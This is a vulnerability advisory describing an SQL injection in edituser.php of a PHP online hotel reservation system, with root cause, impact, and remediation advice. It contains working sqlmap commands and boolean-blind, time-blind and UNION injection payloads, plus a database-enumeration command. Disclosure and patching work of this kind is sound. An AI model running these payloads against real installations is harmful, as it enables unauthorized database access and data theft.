# Online Hotel Reservation System In PHP With Source Code - SQL Injection in edituser.php

## NAME OF AFFECTED PRODUCT(S)

- Online Hotel Reservation System In PHP With Source Code

## Vendor Homepage

- [Online Hotel Reservation System In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-hotel-reservation-system-in-php-with-source-code/)

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

- YoSheep

### VERSION(S)

- V1.0

### Software Link

- https://download.code-projects.org/details/f2af5165-f165-4d1c-9648-394dc5119f9d

## PROBLEM TYPE

### Vulnerability Type

- SQL injection

### Root Cause

- The edituser.php component directly interpolates the userid parameter into SQL statements without proper sanitization or use of prepared statements. This unsafe practice allows adversaries to inject crafted SQL payloads, thereby altering the intended query logic and executing arbitrary SQL commands against the backend database.

### Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION

- During a security assessment of the *Online Hotel Reservation System In PHP With Source Code*, a critical SQL injection vulnerability was identified in the edituser.php file. The flaw arises from insufficient validation of the userid parameter, which is directly embedded into SQL queries. Exploitation of this flaw allows unauthenticated attackers to inject arbitrary SQL statements, gain access to sensitive data, escalate privileges, and potentially gain control of the application environment. Immediate remediation is strongly advised to mitigate the risk of exploitation.

## Vulnerability Details and Proof of Concept (PoC)

### Vulnerability type:

* Boolean-based blind SQL injection
* Time-based blind SQL injection
* UNION-based SQL injection

### Vulnerability location:

* Parameter: id (GET)

### Proof of Concept Payloads

Using sqlmap, the injection can be demonstrated as follows:

```cmd
python3 sqlmap.py -u "http://xxx.xxx.xxx.xxx/newhotel/admin/edituser.php?id=1"
```

Example Findings:

```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: id=1%' AND 4143=4143#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1%' AND (SELECT 6685 FROM (SELECT(SLEEP(5)))QwyR) AND 'vghs%'='vghs

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: id=1%' UNION ALL SELECT NULL,CONCAT(0x7171707671,0x64624b584f7078736c54714f53556a6d7245764648744e7347477950584e4d446d5172507251426b,0x716a767a71),NULL,NULL#
---
```

![image-20250825132332048](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250825132332048.png)、

### Attack Demonstration

An attacker can enumerate databases with the following command:

```
python3 sqlmap.py -u "http://xxx.xxx.xxx.xxx/newhotel/admin/edituser.php?id=1" --dbs
```

Example Result:

Extracted list of databases from the backend MySQL server.

![image-20250825132624083](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250825132624083.png)

## Suggested Remediation

1. **Use Prepared Statements and Parameterized Queries**

   Implement parameterized queries (mysqli or PDO) to ensure user inputs are treated strictly as data, preventing SQL injection.

2. **Implement Input Validation and Sanitization**

   Validate incoming parameters against expected formats (e.g., numeric IDs). Reject or sanitize unexpected input before processing.

3. **Apply the Principle of Least Privilege**

   Restrict the privileges of the database account used by the application. Avoid using high-privilege accounts (e.g., root).

4. **Conduct Regular Security Audits**

   Periodically review source code and perform penetration testing to identify and remediate potential vulnerabilities.

5. **Upgrade Deprecated Libraries**

   Replace legacy mysql_* functions with mysqli or PDO, which provide better security support and long-term maintainability.